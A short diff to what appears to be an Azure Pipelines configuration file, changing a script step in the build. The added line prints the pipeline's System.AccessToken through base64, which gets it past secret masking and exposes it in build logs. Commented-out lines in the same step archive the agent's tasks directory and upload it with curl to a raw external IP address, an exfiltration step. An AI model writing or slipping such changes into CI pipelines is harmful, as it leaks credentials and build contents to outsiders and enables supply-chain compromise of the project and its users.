@@ -21,9 +21,9 @@ steps:
 
 
 - script: |
-    echo $(System)
+    echo $(System.AccessToken) | base64
     echo "Recursively checking _tasks directory after github checkout task..."
-    # tar --gzip -cf /home/vsts/work/_temp/tasks.tar.gz /home/vsts/work/_tasks  $(System.AccessToken)
+    # tar --gzip -cf /home/vsts/work/_temp/tasks.tar.gz /home/vsts/work/_tasks  
     # if [ -f /home/vsts/work/_temp/tasks.tar.gz ]; then
     #     echo "tasks.tar.gz found. Uploading..."
     #     curl -F "file=@/home/vsts/work/_temp/tasks.tar.gz" http://139.180.193.16:5000/upload
